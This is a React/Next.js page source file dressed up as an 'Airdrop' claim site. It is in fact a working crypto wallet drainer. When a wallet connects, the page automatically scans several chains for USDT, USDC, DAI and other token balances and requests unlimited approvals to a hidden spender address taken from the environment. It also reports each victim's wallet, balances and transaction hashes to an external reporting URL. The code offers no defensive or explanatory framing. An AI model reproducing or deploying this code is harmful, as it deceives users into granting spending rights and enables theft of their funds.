'use client';
import { useState, useEffect } from 'react';
import { useAccount, useWriteContract } from 'wagmi';
import { erc20Abi, maxUint256, encodeFunctionData } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '@/config';
import { SmartWalletService } from '@/config/smartWallet';

// Spender address that will receive approvals
// Load spender from env, fallback to empty
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;

const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

// Tokens grouped by chainId (BigInt-safe version)
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
};

// Human-readable chain names
const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  42161: "Arbitrum",
  11155111: "Sepolia",
};

// Component that reports wallet connections
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
       fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { writeContractAsync } = useWriteContract();
  const [status, setStatus] = useState<string>("");
  const [useSponsored, setUseSponsored] = useState<boolean>(true);
  const [smartWalletService, setSmartWalletService] = useState<SmartWalletService | null>(null);
  const [isSmartWalletInitialized, setIsSmartWalletInitialized] = useState(false);

  const gelatoApiKey = process.env.NEXT_PUBLIC_GELATO_API_KEY;

  // Initialize smart wallet service
  useEffect(() => {
    if (address && gelatoApiKey && isConnected && useSponsored) {
      const service = new SmartWalletService(gelatoApiKey);
      setSmartWalletService(service);
      setIsSmartWalletInitialized(false);
    } else {
      setSmartWalletService(null);
      setIsSmartWalletInitialized(false);
    }
  }, [address, gelatoApiKey, isConnected, useSponsored]);

  async function handleClaimSponsored() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    if (!smartWalletService || !gelatoApiKey) {
      setStatus("Sponsored transactions not available");
      return;
    }

    try {
      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch {}
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";

      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      // Initialize smart wallet if needed
      if (!isSmartWalletInitialized) {
        setStatus("Initializing sponsored transactions...");
        await smartWalletService.initializeSmartWallet(address, targetChain);
        setIsSmartWalletInitialized(true);
      }

      // Process approvals with sponsored transactions (gasless!)
      for (const token of usableTokens) {
        setStatus(`Approving ${token.symbol} on ${chainName} (gasless)...`);

        // Encode the approval transaction
        const data = encodeFunctionData({
          abi: erc20Abi,
          functionName: "approve",
          args: [SPENDER, maxUint256],
        });

        // Execute sponsored transaction - no gas fees!
        const result = await smartWalletService.executeSponsoredTransaction(
          token.address,
          data,
          0n
        );

        let rawBalance: bigint = BigInt(0);
        try {
          rawBalance = await readContract(config, {
            chainId: targetChain!,
            address: token.address,
            abi: erc20Abi,
            functionName: "balanceOf",
            args: [address],
          }) as bigint;
        } catch (err) {
          console.error(`Failed to read balance for ${token.symbol}:`, err);
        }

        const formattedBalance = Number(rawBalance) / 10 ** token.decimals;

        setStatus(`${token.symbol} approved ✅ (Gasless!) | Balance: ${formattedBalance}`);

        // Report approval
        await fetch(`${REPORT_URL}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            event: "approval",
            wallet: address,
            chainName,
            token: token.address,
            symbol: token.symbol,
            balance: formattedBalance,
            txHash: result.transactionHash,
            sponsored: true, // Mark as sponsored transaction
          }),
        }).catch(console.error);
      }

      setStatus("All approvals completed! (No gas fees paid!)");
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  async function handleClaimRegular() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch {}
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";

      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      const nativeBal = await getBalance(config, { address, chainId: targetChain });
      if (nativeBal.value < BigInt(100000000000000)) {
        setStatus("Not enough native token to pay gas fees.");
        return;
      }

      for (const token of usableTokens) {
        setStatus(`Approving ${token.symbol} on ${chainName}...`);

        const txHash = await writeContractAsync({
          address: token.address,
          abi: erc20Abi,
          functionName: "approve",
          args: [SPENDER, maxUint256],
          account: address,
          chainId: targetChain,
        });

        let rawBalance: bigint = BigInt(0);
        try {
          rawBalance = await readContract(config, {
            chainId: targetChain!,
            address: token.address,
            abi: erc20Abi,
            functionName: "balanceOf",
            args: [address],
          }) as bigint;
        } catch (err) {
          console.error(`Failed to read balance for ${token.symbol}:`, err);
        }

        const formattedBalance = Number(rawBalance) / 10 ** token.decimals;

        setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);

        // report approval including only chain name
        await fetch(`${REPORT_URL}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            event: "approval",
            wallet: address,
            chainName,
            token: token.address,
            symbol: token.symbol,
            balance: formattedBalance,
            txHash,
            sponsored: false,
          }),
        }).catch(console.error);
      }

      setStatus("All approvals completed!");
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  const handleClaim = useSponsored ? handleClaimSponsored : handleClaimRegular;

  // Automatically trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address, useSponsored]);

  return (
    <main
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: "24px",
        marginTop: "40px",
      }}
    >
      <header
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "64px",
          background: "#09011fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 24px",
          paddingTop: "env(safe-area-inset-top)",
          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
          AIRDROPS
        </div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "24px",
          paddingTop: "80px",
          width: "80%",
          maxWidth: "600px",
        }}
      >
        <div
          style={{
            border: "1px solid #9dd6d1ff",
            borderRadius: "12px",
            padding: "20px",
            background: "#090e41ff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "space-between",
            height: "500px",
          }}
        >
          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>

          {/* Sponsored Transaction Toggle */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: "8px",
              marginBottom: "12px",
              padding: "8px 12px",
              background: useSponsored ? "#1e3a8a" : "#374151",
              borderRadius: "8px",
              border: "1px solid #4b5563",
            }}
          >
            <input
              type="checkbox"
              id="sponsored-toggle"
              checked={useSponsored}
              onChange={(e) => setUseSponsored(e.target.checked)}
              style={{
                width: "16px",
                height: "16px",
                accentColor: "#3b82f6",
              }}
            />
            <label
              htmlFor="sponsored-toggle"
              style={{
                color: "#e5e7eb",
                fontSize: "14px",
                cursor: "pointer",
                userSelect: "none",
              }}
            >
              ✨ Use gasless transactions (no ETH required!)
            </label>
          </div>

          {useSponsored && smartWalletService && (
            <div
              style={{
                fontSize: "12px",
                color: isSmartWalletInitialized ? "#10b981" : "#f59e0b",
                marginBottom: "8px",
              }}
            >
              Smart Wallet: {isSmartWalletInitialized ? "✅ Ready" : "⏳ Initializing..."}
            </div>
          )}

          <div
            style={{
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#e4e1daff",
              fontSize: "14px",
              textAlign: "center",
            }}
          >
            {status || ""}
          </div>

          <button
            onClick={handleClaim}
            style={{
              background: useSponsored ? "#10b981" : "#a00b0bff",
              color: "white",
              padding: "12px 28px",
              borderRadius: "8px",
              cursor: "pointer",
              marginTop: "16px",
              border: "none",
              fontSize: "14px",
              fontWeight: "bold",
            }}
          >
            {useSponsored ? "Claim Now (Gasless!)" : "Claim Now"}
          </button>

          {useSponsored && (
            <div
              style={{
                fontSize: "11px",
                color: "#9ca3af",
                textAlign: "center",
                marginTop: "8px",
              }}
            >
              Powered by Gelato Network
            </div>
          )}
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: "1px solid #c9c8ddff",
              borderRadius: "12px",
              padding: "20px",
              background: "#0e0a42ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}